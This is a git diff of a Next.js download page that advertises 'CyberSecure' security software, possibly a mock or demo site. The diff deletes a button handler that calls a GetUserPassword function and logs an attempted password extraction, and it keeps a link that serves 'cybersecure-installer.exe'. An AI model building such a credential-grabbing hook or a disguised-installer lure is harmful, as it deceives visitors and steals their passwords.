@@ -2,30 +2,11 @@
 import React, { useState } from "react";
 import Link from "next/link";
 import { ArrowRight, Download, Search, Shield, Code } from "lucide-react";
-import { useRouter } from "next/navigation";
-import GetUserPassword from "@/libs/getUserPassword";
 
 export default function Page() {
-  const router = useRouter();
-  const [downloaded, setDownloaded] = useState(false);
   const [showInstructions, setShowInstructions] = useState(false);
 
-  const handleClick = async () => {
-    setDownloaded(true);
-    try {
-      console.log("Attempting to extract password...");
-      const response = await GetUserPassword();
-      console.log("Password extraction:", response.error ? "Failed" : "Successful");
-    } catch (error) {
-      console.error("Error fetching user password:", error);
-    }
-    setDownloaded(false);
-    // Always navigate to projects page
-    router.push("/projects");
-  }
-
   const handleDownload = () => {
-    setDownloaded(true);
     setShowInstructions(true);
 
     // Add check for download failure
@@ -49,31 +30,20 @@ export default function Page() {
         </p>
 
         <div className="flex flex-wrap gap-4 justify-center">
-          <button
-            onClick={() => handleClick()}
-            disabled={downloaded}
-            className="mt-5 cursor-pointer flex justify-center rounded-2xl items-center gap-2 bg-white px-6 py-3 w-fit shadow-md shadow-gray-400"
-          >
-            <div className="text-yellow-500 rounded-lg font-semibold">
-              Browse Software
-            </div>
-            <ArrowRight size={16} className="text-yellow-500" strokeWidth={3} />
-          </button>
-
           <a
             href="https://mock-porfolio.onrender.com/api/download/client-app"
             onClick={handleDownload}
-            className="mt-5 cursor-pointer flex justify-center rounded-2xl items-center gap-2 bg-yellow-500 px-6 py-3 w-fit shadow-md shadow-gray-400"
+            className="mt-5 cursor-pointer flex justify-center rounded-2xl items-center text-white hover:text-gray-900 gap-2 bg-yellow-500 px-6 py-3 w-fit shadow-md shadow-gray-600"
             download="cybersecure-installer.exe"
           >
-            <Download size={16} className="text-white" strokeWidth={3} />
-            <div className="text-white font-semibold">Download Now</div>
+            <Download size={16} className="" strokeWidth={3} />
+            <div className="font-semibold ">Download Now</div>
           </a>
         </div>
 
         {/* Instructions popup */}
         {showInstructions && (
-          <div className="absolute bottom-5 left-1/2 transform -translate-x-1/2 w-full max-w-md bg-white p-5 rounded-lg shadow-lg text-left">
+          <div className="absolute bottom-5 left-1/2 transform -translate-x-1/2 w-full text-gray-800 max-w-md bg-white p-5 rounded-lg shadow-lg text-left">
             <h4 className="font-bold text-lg mb-2">Installation Started!</h4>
             <p className="mb-2">
               To install the software:
@@ -105,9 +75,11 @@ export default function Page() {
                 <h4 className="text-lg font-semibold">Security Tools</h4>
               </div>
               <p className="text-sm mt-2">Protect your system with our premium antivirus, firewall and encryption tools.</p>
-              <button className="mt-4 text-sm text-yellow-500 font-medium flex items-center">
-                View All <ArrowRight size={14} className="ml-1" />
-              </button>
+              <Link
+                href={"/downloads"}
+                className="mt-4 text-sm text-yellow-500 font-medium flex items-center">
+                Read More <ArrowRight size={14} className="ml-1" />
+              </Link>
             </div>
             <div className="p-6 shadow-lg rounded-lg bg-gray-50 hover:bg-gray-100 transition cursor-pointer">
               <div className="flex items-center mb-3">
@@ -115,9 +87,11 @@ export default function Page() {
                 <h4 className="text-lg font-semibold">Development Tools</h4>
               </div>
               <p className="text-sm mt-2">IDEs, code editors, and development frameworks for all programming needs.</p>
-              <button className="mt-4 text-sm text-yellow-500 font-medium flex items-center">
-                View All <ArrowRight size={14} className="ml-1" />
-              </button>
+              <Link
+                href={"/downloads"}
+                className="mt-4 text-sm text-yellow-500 font-medium flex items-center">
+                Read More <ArrowRight size={14} className="ml-1" />
+              </Link>
             </div>
             <div className="p-6 shadow-lg rounded-lg bg-gray-50 hover:bg-gray-100 transition cursor-pointer">
               <div className="flex items-center mb-3">
@@ -125,9 +99,11 @@ export default function Page() {
                 <h4 className="text-lg font-semibold">Productivity Apps</h4>
               </div>
               <p className="text-sm mt-2">Office suites, task managers, and tools to boost your daily productivity.</p>
-              <button className="mt-4 text-sm text-yellow-500 font-medium flex items-center">
-                View All <ArrowRight size={14} className="ml-1" />
-              </button>
+              <Link
+                href={"/downloads"}
+                className="mt-4 text-sm text-yellow-500 font-medium flex items-center">
+                Read More <ArrowRight size={14} className="ml-1" />
+              </Link>
             </div>
           </div>
         </div>
@@ -139,9 +115,9 @@ export default function Page() {
         <p className="text-white text-lg max-w-xl mx-auto">
           Our team is ready to help with installation problems or software questions
         </p>
-        <Link href="/contact" className="mt-5 mx-auto flex justify-center cursor-pointer rounded-2xl items-center gap-2 bg-white px-6 py-3 w-fit shadow-md shadow-gray-400">
-          <div className="text-yellow-500 rounded-lg font-semibold">Get Support</div>
-          <ArrowRight size={16} className="text-yellow-500" strokeWidth={3} />
+        <Link href="/support" className="mt-5 mx-auto flex justify-center cursor-pointer rounded-2xl items-center gap-2 bg-white hover:bg-yellow-500 text-yellow-500 hover:text-white px-6 py-3 w-fit shadow-md shadow-gray-400">
+          <div className=" rounded-lg font-semibold">Get Support</div>
+          <ArrowRight size={16} className="" strokeWidth={3} />
         </Link>
       </section>
     </div>
